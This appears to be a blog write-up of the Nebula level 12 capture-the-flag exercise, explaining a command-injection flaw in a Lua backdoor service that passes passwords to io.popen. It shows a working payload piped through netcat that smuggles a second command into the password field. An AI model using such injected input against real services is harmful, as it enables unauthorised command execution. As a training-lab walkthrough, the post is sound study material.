---
layout: post
title: "20xx-A1-Injection"
category: CTF, Nebula
---

>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; **[Nebula 12](http://exploit-exercises.com/nebula/level12) Agenda**: "There is a backdoor process listening on port 50001"

<center>
	<img src="/images/2015-04-30-20xx-a1-injection/d07c009c4db4f137254e650332c.jpg">
</center>
<br />
This one is pretty easy, it contains [injection flaw](https://www.owasp.org/index.php/Top_10_2013-A1-Injection). The vulnerability arises when a naked unhandled input string falls into "_hash_" function as an "_password_" argument. [io.popen](http://www.lua.org/manual/5.1/manual.html#pdf-io.popen) lua facility starts commands chain in a separated process, thereby we can provide injection:
{% highlight sh linenos %}
level12@nebula:~$ echo "0; getflag > /tmp/flag; echo 0" | nc localhost 50001
Password: Better luck next time
level12@nebula:~$ cat /tmp/flag 
You have successfully executed getflag on a target account
{% endhighlight %}
As well, in this manner we didn't break the execution chain. "_Voila_"!  